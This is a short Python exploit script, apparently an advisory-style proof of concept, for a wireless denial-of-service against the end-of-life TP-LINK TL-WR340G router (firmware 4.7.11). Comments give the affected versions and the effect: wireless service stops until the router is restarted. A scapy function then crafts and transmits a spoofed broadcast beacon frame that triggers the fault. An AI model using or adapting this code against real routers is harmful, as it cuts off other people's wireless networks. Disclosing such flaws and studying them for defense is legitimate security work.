#!/usr/bin/env python
# -*- encoding: utf-8 -*-
# TP-LINK TL-WR340G Wireless SOHO Router Denial of Service (DoS) Exploit
#
# === intro ===
#
# TP-LINK TL-WR340G is a SOHO router with integrated IEEE 802.11b/g AP.
# Now it's marked End-of-Life.
#
# Transmitting crafted frames in proximity of working router cause device
# to malfunction. Wireless communication stops,  existing clients don't
# receive frames from AP ( except beacons ), new clients can't connect.
#
#
# === details ===
#
# Affected product: TL-WR340G Wireless router
# Firm Version:  4.7.11  Build 101102 Rel.60376n
# Hardware Version: WR340G v3
# Local/remote: Local ( wirelessly )
#
# Vulnerability can be spotted by crafting and transmitting frame with scapy:
# Attacker could cease wireless traffic. To resume AP functionality user
# must restart wireless interface in WebGUI or restart device.
def tplink_dos(iface, ap_mac):
    fr = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2=ap_mac,addr3=ap_mac)/Dot11Beacon()/Dot11Elt()
    sendp(fr, iface=iface, count=5)
